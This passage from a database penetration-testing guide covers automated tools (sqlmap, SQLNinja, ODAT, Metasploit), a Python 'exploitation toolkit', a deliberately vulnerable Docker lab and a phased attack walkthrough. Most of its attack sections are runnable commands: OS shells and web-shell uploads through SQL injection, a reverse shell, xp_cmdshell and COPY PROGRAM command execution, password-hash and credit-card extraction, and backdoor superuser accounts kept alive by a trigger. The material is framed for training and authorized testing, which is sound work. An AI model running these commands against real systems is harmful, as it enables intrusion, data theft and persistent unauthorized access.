ORDER BY qs.total_rows DESC;

-- MySQL: Check for suspicious outfile operations
-- Review general_log or slow_query_log:
-- grep -i "into outfile\|into dumpfile\|load_file\|load data" /var/log/mysql/general.log
```

### 8.5 Timeline Reconstruction

```bash
# Create a unified timeline from database artifacts
# Combine: transaction logs + audit logs + OS file timestamps + application logs

# PostgreSQL WAL timeline
pg_waldump --start=0/1000000 --end=0/2000000 \
  /var/lib/postgresql/16/main/pg_wal/000000010000000000000001 2>/dev/null | \
  awk '{print $1, $2, $3}' > wal_timeline.txt

# MSSQL: Build timeline from fn_dblog + server audit
# Export to CSV for timeline analysis tools

# File system timeline (database files, config changes)
find /var/lib/postgresql/ -newer /tmp/baseline_timestamp -ls > fs_changes.txt
stat /var/lib/postgresql/16/main/pg_hba.conf  # Check config modification time
```

### 8.6 Deleted Data Recovery

#### MVCC-Based Recovery (PostgreSQL)

```sql
-- PostgreSQL uses MVCC: deleted rows remain on disk until VACUUM
-- If VACUUM hasn't run, "deleted" rows are still in the heap

-- Use pg_dirtyread extension to read dead tuples
CREATE EXTENSION pg_dirtyread;
SELECT * FROM pg_dirtyread('public.deleted_secrets')
  AS t(id INT, secret_data TEXT, created_at TIMESTAMP);

-- Pageinspect for raw page analysis
CREATE EXTENSION pageinspect;
SELECT * FROM heap_page_items(get_raw_page('users', 0));
-- lp_flags: 0=unused, 1=normal, 2=redirect, 3=dead
-- Dead tuples (lp_flags=3) are deleted but not yet vacuumed
```

#### Undo Log Recovery (Oracle)

```sql
-- Oracle Flashback Query: read data as it existed in the past
SELECT * FROM users AS OF TIMESTAMP (SYSTIMESTAMP - INTERVAL '1' HOUR);

-- Flashback Table: restore a table to a previous state
FLASHBACK TABLE users TO TIMESTAMP (SYSTIMESTAMP - INTERVAL '2' HOUR);

-- Flashback versions query: see all versions of a row
SELECT versions_starttime, versions_endtime, versions_operation,
       username, password_hash
FROM users
VERSIONS BETWEEN TIMESTAMP MINVALUE AND MAXVALUE
WHERE username = 'admin';
```

#### WAL Analysis for Recovery (PostgreSQL)

```bash
# Decode WAL to find INSERT/UPDATE/DELETE operations
pg_waldump /var/lib/postgresql/16/main/pg_wal/000000010000000000000001 \
  --rmgr=Heap 2>/dev/null | grep -E "INSERT|DELETE|UPDATE"

# Point-in-time recovery to before the deletion
# Stop PostgreSQL, set recovery parameters:
# recovery_target_time = '2025-05-01 12:00:00'
# restore_command = 'cp /backup/wal/%f %p'
# Then start PostgreSQL in recovery mode
```

### 8.7 Database Memory Forensics

```bash
# Dump the database process memory for analysis
# Find the PostgreSQL backend PID
pgrep -a postgres

# Create a memory dump (requires root or ptrace capability)
gcore -o /tmp/pg_memdump $(pgrep -o postgres)

# Search for sensitive strings in the dump
strings /tmp/pg_memdump.* | grep -iE "password|secret|token|key" | head -50

# For MSSQL on Linux:
gcore -o /tmp/mssql_memdump $(pgrep -o sqlservr)
strings /tmp/mssql_memdump.* | grep -iE "password|secret" | sort -u

# On Windows: use procdump
# procdump -ma sqlservr.exe C:\temp\sqlservr.dmp
# Then analyze with strings or WinDbg
```

---

## 9. Automated Database Testing

### 9.1 sqlmap — Complete Reference

sqlmap is the de facto standard for automated SQL injection detection and exploitation.

#### Basic Usage

```bash
# Test a URL parameter for SQL injection
sqlmap -u "http://target.com/page?id=1" --batch

# Test POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch

# Test with cookies and headers
sqlmap -u "http://target.com/api/users?id=1" \
  --cookie="session=abc123" \
  --headers="Authorization: Bearer eyJ..." \
  --batch

# Test all parameters
sqlmap -u "http://target.com/search?q=test&cat=1&page=1" -p "q,cat" --batch
```

#### Risk and Level Configuration

```bash
# Level: 1-5 (default 1)
# Level 1: Basic tests
# Level 2: Adds time-based blind, HTTP cookie testing
# Level 3: Adds User-Agent/Referer testing
# Level 4: Additional payloads
# Level 5: Hostname header tests

# Risk: 1-3 (default 1)
# Risk 1: Innocuous tests only
# Risk 2: Adds heavy time-based tests
# Risk 3: Adds OR-based SQL injection (may modify data!)

# Comprehensive scan
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch

# Specific injection techniques
# B: Boolean-based blind
# E: Error-based
# U: UNION query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries
sqlmap -u "http://target.com/page?id=1" --technique=BEUST --batch
```

#### Tamper Scripts

```bash
# List all available tamper scripts
sqlmap --list-tampers

# Common tamper scripts for WAF bypass:
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,between,randomcase --batch

# Tamper script reference:
# space2comment     : Replaces spaces with /**/
# between           : Replaces > with NOT BETWEEN 0 AND #
# randomcase        : Random uppercase/lowercase
# charencode        : URL-encode all characters
# charunicodeencode : Unicode URL-encode
# equaltolike       : Replaces = with LIKE
# greatest          : Replaces > with GREATEST
# apostrophemask    : Replaces ' with UTF-8 fullwidth equivalent
# base64encode      : Base64-encode the payload
# space2hash        : MySQL: replaces spaces with # and newline
# space2mssqlblank  : MSSQL: replaces spaces with random blank chars
# percentage        : Adds % before each character (IIS/ASP)

# Chaining multiple tampers for heavy WAF evasion:
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,charencode,randomcase,between \
  --random-agent --delay=2 --batch
```

#### OS Shell and File Operations

```bash
# Get an OS shell (interactive command execution)
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# Read files from the server
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd" --batch

# Write files to the server
sqlmap -u "http://target.com/page?id=1" \
  --file-write="/tmp/shell.php" \
  --file-dest="/var/www/html/shell.php" --batch

# UDF injection (for MySQL/PostgreSQL)
sqlmap -u "http://target.com/page?id=1" --udf-inject --batch

# Full pwn: OS shell + privilege escalation
sqlmap -u "http://target.com/page?id=1" --os-pwn --batch
```

#### Database Enumeration and Extraction

```bash
# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D targetdb --tables --batch

# Enumerate columns
sqlmap -u "http://target.com/page?id=1" -D targetdb -T users --columns --batch

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D targetdb -T users --dump --batch

# Dump specific columns only
sqlmap -u "http://target.com/page?id=1" -D targetdb -T users \
  -C "username,password" --dump --batch

# Dump all databases
sqlmap -u "http://target.com/page?id=1" --dump-all --batch

# Search for columns containing specific keywords
sqlmap -u "http://target.com/page?id=1" --search -C "password" --batch
sqlmap -u "http://target.com/page?id=1" --search -T "user" --batch

# Current user, DBA check, hostname
sqlmap -u "http://target.com/page?id=1" --current-user --is-dba --hostname --batch

# Password hash extraction
sqlmap -u "http://target.com/page?id=1" --passwords --batch
```

#### DBMS-Specific sqlmap Options

```bash
# Force specific DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=postgresql --batch
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --batch
sqlmap -u "http://target.com/page?id=1" --dbms=mssql --batch
sqlmap -u "http://target.com/page?id=1" --dbms=oracle --batch

# Second-order injection
sqlmap -u "http://target.com/register" \
  --data="username=test&password=test" \
  --second-url="http://target.com/profile" --batch

# Direct database connection (no web app needed)
sqlmap -d "postgresql://user:pass@10.10.10.50:5432/dbname" --dump-all --batch
sqlmap -d "mysql://root:pass@10.10.10.50:3306/dbname" --os-shell --batch
```

### 9.2 SQLNinja for MSSQL

```bash
# SQLNinja is specialized for MSSQL exploitation through SQL injection
# Configuration in sqlninja.conf:
# --host = target
# --port = 80
# --method = POST
# --page = /vulnerable.asp
# --stringstart = username=
# --stringend = &password=test
# --param = inject_here

# Fingerprint mode
sqlninja -m fingerprint

# Bruteforce sa password
sqlninja -m bruteforce -w /usr/share/wordlists/rockyou.txt

# Upload a shell
sqlninja -m upload

# Get a reverse shell
sqlninja -m revshell

# Establish a VNC connection through the injection
sqlninja -m metasploit
```

### 9.3 ODAT for Oracle

```bash
# Oracle Database Attacking Tool — comprehensive Oracle pentest tool

# Full scan of an Oracle instance
odat all -s 10.10.10.50 -p 1521 -d ORCL

# SID guessing
odat sidguesser -s 10.10.10.50 -p 1521

# Password guessing
odat passwordguesser -s 10.10.10.50 -p 1521 -d ORCL

# Execute system commands
odat externaltable -s 10.10.10.50 -p 1521 -d ORCL -U SCOTT -P tiger \
  --exec /bin/bash "-c 'id'"

# Read files
odat utlfile -s 10.10.10.50 -p 1521 -d ORCL -U SCOTT -P tiger \
  --getFile /etc passwd /tmp/passwd.txt

# Upload files
odat utlfile -s 10.10.10.50 -p 1521 -d ORCL -U SCOTT -P tiger \
  --putFile /tmp evil.sh /tmp/evil.sh

# SSRF via UTL_HTTP
odat utlhttp -s 10.10.10.50 -p 1521 -d ORCL -U SCOTT -P tiger \
  --url "http://169.254.169.254/latest/meta-data/"

# Java exploitation
odat java -s 10.10.10.50 -p 1521 -d ORCL -U SCOTT -P tiger \
  --exec /bin/bash "-c 'whoami'"

# DBMS_SCHEDULER exploitation
odat dbmsscheduler -s 10.10.10.50 -p 1521 -d ORCL -U SCOTT -P tiger \
  --exec /bin/bash "-c 'id'"

# Privilege escalation
odat privesc -s 10.10.10.50 -p 1521 -d ORCL -U SCOTT -P tiger \
  --dba-with-execute-any-procedure
```

### 9.4 NoSQLMap

```bash
# NoSQLMap — automated NoSQL injection and exploitation

# Interactive mode
nosqlmap

# Target configuration:
# 1. Set target host/port
# 2. Set target path
# 3. Set HTTP method
# 4. Set POST data or parameters

# Attack options:
# 1. NoSQL injection scan
# 2. NoSQL injection attack
# 3. Scanner — scan for default access to MongoDB/CouchDB
# 4. Dictionary attack against MongoDB credentials

# MongoDB-specific:
# - Authentication bypass
# - Data extraction via $gt/$ne operators
# - Server-side JavaScript injection
```

### 9.5 Metasploit Database Modules

```bash
# PostgreSQL
use auxiliary/scanner/postgres/postgres_login
use auxiliary/scanner/postgres/postgres_version
use auxiliary/scanner/postgres/postgres_hashdump
use exploit/linux/postgres/postgres_payload
use auxiliary/admin/postgres/postgres_sql
use auxiliary/admin/postgres/postgres_readfile

# MySQL
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/admin/mysql/mysql_sql
use auxiliary/admin/mysql/mysql_enum
use exploit/multi/mysql/mysql_udf_payload

# MSSQL
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/admin/mssql/mssql_sql
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_escalate_dbowner
use auxiliary/admin/mssql/mssql_escalate_execute_as
use auxiliary/admin/mssql/mssql_findandsampledata
use exploit/windows/mssql/mssql_payload
use exploit/windows/mssql/mssql_clr_payload

# Oracle
use auxiliary/scanner/oracle/sid_enum
use auxiliary/scanner/oracle/sid_brute
use auxiliary/scanner/oracle/oracle_login
use auxiliary/admin/oracle/oracle_sql
use exploit/multi/oracle/oracle_java_deserialization

# MongoDB
use auxiliary/scanner/mongodb/mongodb_login
use auxiliary/gather/mongodb_js_inject
```

### 9.6 Custom Python Exploitation Scripts

```python
#!/usr/bin/env python3
"""
Database exploitation toolkit — multi-DBMS support.
Provides connection testing, enumeration, and exploitation functions.
"""

import sys
import hashlib

# ---- PostgreSQL exploitation ----

def pg_exploit(host, port, user, password, database):
    """PostgreSQL enumeration and exploitation."""
    import psycopg2

    conn = psycopg2.connect(
        host=host, port=port, user=user,
        password=password, dbname=database
    )
    conn.autocommit = True
    cur = conn.cursor()

    # Check if superuser
    cur.execute("SELECT current_setting('is_superuser')")
    is_super = cur.fetchone()[0]
    print(f"[*] Superuser: {is_super}")

    # Enumerate databases
    cur.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
    databases = cur.fetchall()
    print(f"[*] Databases: {[d[0] for d in databases]}")

    # Extract password hashes
    if is_super == 'on':
        cur.execute("SELECT rolname, rolpassword FROM pg_authid WHERE rolpassword IS NOT NULL")
        for row in cur.fetchall():
            print(f"[+] {row[0]}: {row[1]}")

        # Read file via COPY PROGRAM
        cur.execute("CREATE TEMP TABLE _cmd (output TEXT)")
        cur.execute("COPY _cmd FROM PROGRAM 'id'")
        cur.execute("SELECT * FROM _cmd")
        cmd_output = cur.fetchall()
        print(f"[+] OS identity: {cmd_output[0][0] if cmd_output else 'N/A'}")
        cur.execute("DROP TABLE _cmd")

    cur.close()
    conn.close()


# ---- MySQL exploitation ----

def mysql_exploit(host, port, user, password, database):
    """MySQL enumeration and exploitation."""
    import pymysql

    conn = pymysql.connect(
        host=host, port=port, user=user,
        password=password, database=database
    )
    cur = conn.cursor()

    # Check privileges
    cur.execute("SHOW GRANTS FOR CURRENT_USER()")
    grants = cur.fetchall()
    print("[*] Current grants:")
    for g in grants:
        print(f"    {g[0]}")

    # Check secure_file_priv
    cur.execute("SHOW VARIABLES LIKE 'secure_file_priv'")
    sfp = cur.fetchone()
    print(f"[*] secure_file_priv: {sfp[1] if sfp else 'N/A'}")

    # Enumerate all tables across all databases
    cur.execute("""
        SELECT table_schema, table_name
        FROM information_schema.TABLES
        WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys')
    """)
    tables = cur.fetchall()
    print(f"[*] User tables found: {len(tables)}")
    for schema, table in tables:
        print(f"    {schema}.{table}")

    # Extract user password hashes
    try:
        cur.execute("SELECT user, authentication_string FROM mysql.user")
        for row in cur.fetchall():
            print(f"[+] {row[0]}: {row[1]}")
    except pymysql.err.OperationalError as e:
        print(f"[-] Cannot read mysql.user: {e}")

    cur.close()
    conn.close()


# ---- MSSQL exploitation ----

def mssql_exploit(host, port, user, password, database):
    """MSSQL enumeration and exploitation."""
    import pymssql

    conn = pymssql.connect(
        server=host, port=port, user=user,
        password=password, database=database
    )
    cur = conn.cursor()

    # Check if sysadmin
    cur.execute("SELECT IS_SRVROLEMEMBER('sysadmin')")
    is_admin = cur.fetchone()[0]
    print(f"[*] Sysadmin: {bool(is_admin)}")

    # Enumerate databases
    cur.execute("SELECT name FROM sys.databases")
    databases = cur.fetchall()
    print(f"[*] Databases: {[d[0] for d in databases]}")

    # Enumerate linked servers
    cur.execute("SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1")
    linked = cur.fetchall()
    if linked:
        print("[*] Linked servers:")
        for name, ds, prov in linked:
            print(f"    {name} -> {ds} ({prov})")

    # Check xp_cmdshell status
    cur.execute("""
        SELECT name, CAST(value_in_use AS INT) AS enabled
        FROM sys.configurations
        WHERE name = 'xp_cmdshell'
    """)
    xp = cur.fetchone()
    print(f"[*] xp_cmdshell enabled: {bool(xp[1]) if xp else 'Unknown'}")

    # If sysadmin, enable and use xp_cmdshell
    if is_admin:
        cur.execute("EXEC sp_configure 'show advanced options', 1")
        conn.commit()
        cur.execute("RECONFIGURE")
        conn.commit()
        cur.execute("EXEC sp_configure 'xp_cmdshell', 1")
        conn.commit()
        cur.execute("RECONFIGURE")
        conn.commit()
        cur.execute("EXEC xp_cmdshell 'whoami'")
        result = cur.fetchall()
        print(f"[+] xp_cmdshell whoami: {result[0][0] if result else 'N/A'}")

    # Check TRUSTWORTHY databases
    cur.execute("SELECT name FROM sys.databases WHERE is_trustworthy_on = 1")
    trustworthy = cur.fetchall()
    if trustworthy:
        print(f"[!] TRUSTWORTHY databases: {[d[0] for d in trustworthy]}")

    # Check impersonation possibilities
    cur.execute("""
        SELECT DISTINCT b.name
        FROM sys.server_permissions a
        JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
        WHERE a.permission_name = 'IMPERSONATE'
    """)
    impersonate = cur.fetchall()
    if impersonate:
        print(f"[!] Can impersonate: {[i[0] for i in impersonate]}")

    cur.close()
    conn.close()


# ---- Oracle exploitation ----

def oracle_exploit(host, port, user, password, sid):
    """Oracle enumeration and exploitation."""
    import cx_Oracle

    dsn = cx_Oracle.makedsn(host, port, sid=sid)
    conn = cx_Oracle.connect(user, password, dsn)
    cur = conn.cursor()

    # Check current privileges
    cur.execute("SELECT * FROM session_privs")
    privs = cur.fetchall()
    print(f"[*] Session privileges ({len(privs)}):")
    for p in privs:
        print(f"    {p[0]}")

    # Check for DBA role
    cur.execute("SELECT granted_role FROM user_role_privs WHERE granted_role = 'DBA'")
    is_dba = cur.fetchone()
    print(f"[*] DBA role: {'YES' if is_dba else 'NO'}")

    # Enumerate all users
    cur.execute("SELECT username, account_status FROM dba_users ORDER BY username")
    users = cur.fetchall()
    print(f"[*] Database users ({len(users)}):")
    for username, status in users:
        print(f"    {username} ({status})")

    # Check for dangerous privileges
    cur.execute("""
        SELECT grantee, privilege FROM dba_sys_privs
        WHERE privilege IN (
          'CREATE ANY PROCEDURE','EXECUTE ANY PROCEDURE',
          'CREATE ANY TRIGGER','ALTER SYSTEM',
          'GRANT ANY PRIVILEGE','CREATE LIBRARY'
        )
        ORDER BY grantee, privilege
    """)
    dangerous = cur.fetchall()
    if dangerous:
        print("[!] Dangerous privilege grants:")
        for grantee, priv in dangerous:
            print(f"    {grantee}: {priv}")

    cur.close()
    conn.close()


if __name__ == '__main__':
    print("Database Exploitation Toolkit")
    print("Usage: Import functions and call with target parameters")
    print("  pg_exploit(host, port, user, password, database)")
    print("  mysql_exploit(host, port, user, password, database)")
    print("  mssql_exploit(host, port, user, password, database)")
    print("  oracle_exploit(host, port, user, password, sid)")
```

---

## 10. Lab: Database Pentest Engagement

### 10.1 Deploy Vulnerable Database Environment

This lab deploys a multi-DBMS environment for practicing the complete pentest methodology.

#### Docker Compose — Vulnerable Lab

```yaml
# docker-compose.yml — Intentionally vulnerable database lab
# WARNING: Deploy only in isolated networks. Never expose to the internet.

services:
  postgres-vuln:
    image: postgres:15
    container_name: lab-postgres
    environment:
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: postgres
      POSTGRES_DB: production
    ports:
      - "5432:5432"
    volumes:
      - ./init/postgres:/docker-entrypoint-initdb.d
    command: >
      postgres
        -c log_statement=none
        -c ssl=off
    networks:
      - dblab

  mysql-vuln:
    image: mysql:8.0
    container_name: lab-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: webapp
    ports:
      - "3306:3306"
    command: >
      --default-authentication-plugin=mysql_native_password
      --local-infile=1
      --secure-file-priv=""
    volumes:
      - ./init/mysql:/docker-entrypoint-initdb.d
    networks:
      - dblab

  mssql-vuln:
    image: mcr.microsoft.com/mssql/server:2022-latest
    container_name: lab-mssql
    environment:
      ACCEPT_EULA: "Y"
      SA_PASSWORD: "P@ssw0rd123!"
      MSSQL_PID: "Developer"
    ports:
      - "1433:1433"
    networks:
      - dblab

  mongo-vuln:
    image: mongo:6.0
    container_name: lab-mongo
    # No authentication configured (intentionally vulnerable)
    ports:
      - "27017:27017"
    volumes:
      - ./init/mongo:/docker-entrypoint-initdb.d
    networks:
      - dblab

  redis-vuln:
    image: redis:7
    container_name: lab-redis
    # No password, no protected mode (intentionally vulnerable)
    command: redis-server --protected-mode no
    ports:
      - "6379:6379"
    networks:
      - dblab

networks:
  dblab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
```

#### Initialization Scripts

```sql
-- init/postgres/01-setup.sql
-- Create vulnerable PostgreSQL environment

-- Create low-privilege user
CREATE USER app_user WITH PASSWORD 'apppass123';
CREATE USER readonly_user WITH PASSWORD 'readonly';

-- Create tables with sensitive data
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    email VARCHAR(100),
    password_hash VARCHAR(128),
    ssn VARCHAR(11),
    credit_card VARCHAR(19),
    created_at TIMESTAMP DEFAULT NOW()
);

INSERT INTO users (username, email, password_hash, ssn, credit_card) VALUES
('admin', 'admin@corp.com', md5('admin123'), '123-45-6789', '4111-1111-1111-1111'),
('john.doe', 'john@corp.com', md5('password1'), '987-65-4321', '5500-0000-0000-0004'),
('jane.smith', 'jane@corp.com', md5('letmein'), '456-78-9012', '3400-0000-0000-009');

CREATE TABLE api_keys (
    id SERIAL PRIMARY KEY,
    service_name VARCHAR(100),
    api_key VARCHAR(256),
    created_at TIMESTAMP DEFAULT NOW()
);

INSERT INTO api_keys (service_name, api_key) VALUES
('AWS_ACCESS_KEY', 'AKIAIOSFODNN7EXAMPLE'),
('STRIPE_SECRET', 'sk_live_EXAMPLE1234567890'),
('SENDGRID_API', 'SG.EXAMPLE_KEY_VALUE_HERE');

-- Grant minimal permissions (but with intentional weaknesses)
GRANT CONNECT ON DATABASE production TO app_user;
GRANT USAGE ON SCHEMA public TO app_user;
GRANT SELECT ON users TO app_user;
GRANT SELECT ON api_keys TO app_user;

-- Intentional weakness: SECURITY DEFINER function owned by postgres
CREATE OR REPLACE FUNCTION get_user_count()
RETURNS BIGINT
SECURITY DEFINER
AS $$
  SELECT count(*) FROM users;
$$ LANGUAGE SQL;

GRANT EXECUTE ON FUNCTION get_user_count() TO app_user;

-- Install extensions that can be exploited
CREATE EXTENSION IF NOT EXISTS dblink;
CREATE EXTENSION IF NOT EXISTS pg_stat_statements;
```

```sql
-- init/mysql/01-setup.sql
-- Create vulnerable MySQL environment

USE webapp;

CREATE TABLE customers (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100),
    email VARCHAR(100),
    password VARCHAR(128),
    phone VARCHAR(20),
    address TEXT,
    credit_card_number VARCHAR(19),
    cvv VARCHAR(4)
);

INSERT INTO customers (name, email, password, phone, address, credit_card_number, cvv) VALUES
('Alice Johnson', 'alice@example.com', SHA2('alice123', 256), '555-0101', '123 Main St', '4111111111111111', '123'),
('Bob Williams', 'bob@example.com', SHA2('bob456', 256), '555-0102', '456 Oak Ave', '5500000000000004', '456'),
('Carol Davis', 'carol@example.com', SHA2('carol789', 256), '555-0103', '789 Pine Rd', '340000000000009', '789');

-- Create a user with FILE privilege (intentional weakness)
CREATE USER 'fileuser'@'%' IDENTIFIED BY 'filepass';
GRANT SELECT, FILE ON *.* TO 'fileuser'@'%';

-- Create a user with minimal privileges for testing escalation
CREATE USER 'lowpriv'@'%' IDENTIFIED BY 'lowpriv';
GRANT SELECT ON webapp.* TO 'lowpriv'@'%';
```

### 10.2 Execute Complete Pentest

The following walkthrough demonstrates the full pentest lifecycle against the lab.

#### Phase 1: Enumeration

```bash
# Network scan
nmap -sS -sV -p 1433,3306,5432,6379,27017 172.20.0.0/24 -oA lab_scan

# Results will show all five services
# PostgreSQL on 172.20.0.X:5432
# MySQL on 172.20.0.X:3306
# MSSQL on 172.20.0.X:1433
# MongoDB on 172.20.0.X:27017
# Redis on 172.20.0.X:6379

# Banner grabbing
nmap -sV --version-intensity 9 -p 5432,3306,1433,27017,6379 172.20.0.0/24

# PostgreSQL version
psql -h 172.20.0.2 -U postgres -c "SELECT version();"

# MySQL version
mysql -h 172.20.0.3 -u root -proot -e "SELECT @@version;"

# Redis info
redis-cli -h 172.20.0.6 INFO server
```

#### Phase 2: Authentication Testing

```bash
# Test default credentials for all services
# PostgreSQL
psql -h 172.20.0.2 -U postgres -d production -c "\du"
# Success: postgres/postgres

# MySQL
mysql -h 172.20.0.3 -u root -proot -e "SELECT user, host FROM mysql.user;"
# Success: root/root

# MSSQL
sqlcmd -S 172.20.0.4 -U sa -P 'P@ssw0rd123!' -Q "SELECT @@version"
# Success: sa/P@ssw0rd123!

# MongoDB — no auth
mongosh --host 172.20.0.5 --eval "db.adminCommand('listDatabases')"
# Success: no authentication required

# Redis — no auth
redis-cli -h 172.20.0.6 PING
# Success: PONG (no password needed)
```

#### Phase 3: SQL Injection (via application layer or direct)

```bash
# PostgreSQL — COPY PROGRAM for RCE
psql -h 172.20.0.2 -U postgres -d production -c "
  CREATE TEMP TABLE rce (output TEXT);
  COPY rce FROM PROGRAM 'id; hostname; cat /etc/os-release';
  SELECT * FROM rce;"

# MySQL — INTO OUTFILE test
mysql -h 172.20.0.3 -u root -proot -e "
  SELECT 'RCE TEST' INTO OUTFILE '/tmp/test.txt';"

# MSSQL — xp_cmdshell
sqlcmd -S 172.20.0.4 -U sa -P 'P@ssw0rd123!' -Q "
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';"
```

#### Phase 4: Privilege Escalation

```bash
# PostgreSQL: Connect as low-privilege user, attempt escalation
psql -h 172.20.0.2 -U app_user -d production -c "
  -- Check what we can do
  SELECT current_user;
  SELECT * FROM information_schema.role_table_grants
    WHERE grantee = 'app_user';

  -- Try to read password hashes (should fail as non-superuser)
  SELECT rolname, rolpassword FROM pg_authid;

  -- Check SECURITY DEFINER functions
  SELECT proname, proowner::regrole, prosecdef
  FROM pg_proc WHERE prosecdef = true;"

# MySQL: Test FILE privilege
mysql -h 172.20.0.3 -u fileuser -pfilepass -e "
  SELECT LOAD_FILE('/etc/passwd');"

# MSSQL: Check impersonation and TRUSTWORTHY
sqlcmd -S 172.20.0.4 -U sa -P 'P@ssw0rd123!' -Q "
  SELECT name, is_trustworthy_on FROM sys.databases;
  SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
```

#### Phase 5: Data Extraction

```bash
# PostgreSQL: Extract all sensitive data
psql -h 172.20.0.2 -U postgres -d production -c "
  SELECT username, email, ssn, credit_card FROM users;"
psql -h 172.20.0.2 -U postgres -d production -c "
  SELECT service_name, api_key FROM api_keys;"

# MySQL: Dump the database
mysqldump -h 172.20.0.3 -u root -proot webapp > mysql_dump.sql

# MongoDB: Export all collections
mongodump --host 172.20.0.5 --out /tmp/mongo_dump/

# Redis: Dump all keys and values
redis-cli -h 172.20.0.6 --scan --pattern '*' | while read key; do
  echo "=== $key ==="
  redis-cli -h 172.20.0.6 TYPE "$key" | read type
  case "$type" in
    string) redis-cli -h 172.20.0.6 GET "$key" ;;
    hash)   redis-cli -h 172.20.0.6 HGETALL "$key" ;;
    list)   redis-cli -h 172.20.0.6 LRANGE "$key" 0 -1 ;;
    set)    redis-cli -h 172.20.0.6 SMEMBERS "$key" ;;
    zset)   redis-cli -h 172.20.0.6 ZRANGE "$key" 0 -1 WITHSCORES ;;
  esac
done
```

#### Phase 6: Post-Exploitation and Persistence

```bash
# PostgreSQL: Create backdoor account
psql -h 172.20.0.2 -U postgres -d production -c "
  CREATE ROLE backdoor WITH LOGIN PASSWORD 'b4ckd00r!' SUPERUSER;"

# PostgreSQL: Trigger-based persistence
psql -h 172.20.0.2 -U postgres -d production -c "
  CREATE OR REPLACE FUNCTION maintain_backdoor()
  RETURNS TRIGGER AS \$\$
  BEGIN
    -- Recreate backdoor user if deleted
    IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'backdoor') THEN
      EXECUTE 'CREATE ROLE backdoor WITH LOGIN PASSWORD ''b4ckd00r!'' SUPERUSER';
    END IF;
    RETURN NEW;
  END;
  \$\$ LANGUAGE plpgsql;

  CREATE TRIGGER backdoor_trigger
  AFTER INSERT OR UPDATE ON users
  FOR EACH STATEMENT
  EXECUTE FUNCTION maintain_backdoor();"

# MySQL: Create backdoor user
mysql -h 172.20.0.3 -u root -proot -e "
  CREATE USER 'maint'@'%' IDENTIFIED BY 'maint_pass!';
  GRANT ALL PRIVILEGES ON *.* TO 'maint'@'%' WITH GRANT OPTION;
  FLUSH PRIVILEGES;"

# MSSQL: Agent job persistence (see Section 4.5)

# Redis: Write SSH key for persistent access (see Section 6.2)

# MongoDB: Create admin user
mongosh --host 172.20.0.5 --eval "
  use admin;
  db.createUser({
    user: 'backdoor',
    pwd: 'b4ckd00r!',
    roles: [{role: 'root', db: 'admin'}]
  });"
```

#### Phase 7: Clean Up After Engagement

```bash
# CRITICAL: Remove all persistence mechanisms after the engagement

# PostgreSQL
psql -h 172.20.0.2 -U postgres -d production -c "
  DROP TRIGGER IF EXISTS backdoor_trigger ON users;
  DROP FUNCTION IF EXISTS maintain_backdoor();
  DROP ROLE IF EXISTS backdoor;"

# MySQL
mysql -h 172.20.0.3 -u root -proot -e "
  DROP USER IF EXISTS 'maint'@'%';
  FLUSH PRIVILEGES;"

# MSSQL
sqlcmd -S 172.20.0.4 -U sa -P 'P@ssw0rd123!' -Q "
  USE msdb;
  EXEC sp_delete_job @job_name = N'MaintenanceTask';
  EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"

# MongoDB
mongosh --host 172.20.0.5 --eval "
  use admin;
  db.dropUser('backdoor');"

# Redis — restore protected mode
redis-cli -h 172.20.0.6 CONFIG SET protected-mode yes
```

### 10.3 Professional Report Format

The final deliverable of a database pentest engagement. This template covers the structure and content of a professional report.

#### Report Structure

```
1. EXECUTIVE SUMMARY
   - Engagement overview and timeline
   - Overall risk rating (Critical/High/Medium/Low)
   - Key findings summary (3-5 bullet points)
   - Business impact statement
   - Immediate action items

2. SCOPE AND METHODOLOGY
   - Systems tested (IP/hostname/port/DBMS/version)
   - Testing methodology (OWASP, PTES, custom)
   - Testing type (black-box/gray-box/white-box)
   - Tools used
   - Limitations and exclusions

3. FINDINGS

   3.1 [CRITICAL] MongoDB — No Authentication
       CVSS v3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
       CWE-306: Missing Authentication for Critical Function
       
       Description: MongoDB instance at 172.20.0.5:27017 accepts
       connections without any authentication. All databases and
       collections are readable and writable by any network client.
       
       Impact: Complete data breach. Attacker can read, modify,
       or delete all data. 3 databases, 12 collections,
       approximately 45,000 documents exposed including PII.
       
       Evidence:
       $ mongosh --host 172.20.0.5 --eval "db.adminCommand('listDatabases')"
       { databases: [ { name: 'admin'... }, { name: 'production'... } ] }
       
       Remediation:
       1. Enable authentication: add --auth flag or security.authorization: enabled
       2. Create administrative user with strong password
       3. Bind to specific interfaces (not 0.0.0.0)
       4. Enable TLS for all connections
       5. Implement network-level access controls (firewall/security groups)

